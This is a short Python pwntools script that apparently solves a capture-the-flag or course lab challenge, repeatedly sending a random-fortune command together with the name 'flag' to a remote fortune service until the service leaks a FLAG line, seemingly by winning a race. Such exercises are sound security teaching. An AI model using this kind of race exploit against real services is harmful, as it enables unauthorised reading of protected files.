#!/usr/bin/env python3

import pwn

if __name__ == '__main__':
	r = pwn.remote('up.zoolab.org', 10931)

	s = '''Welcome to the UNIX Fortune database service (1000).
Commands: [L] List fortunes; [R] Random fortune; [Q] Quit
     .... or type a fortune name to read it.
'''
	p = r.recvuntil(s.encode()).decode()
	print(p)

	f = False
	while not f:
		s = 'R\nflag\n'
		print(s)
		r.send(s.encode())

		for _ in range(2):
			p = r.recvline().decode()
			print(p)
			if p.startswith('F> FLAG{'):
				f = True

	r.close()
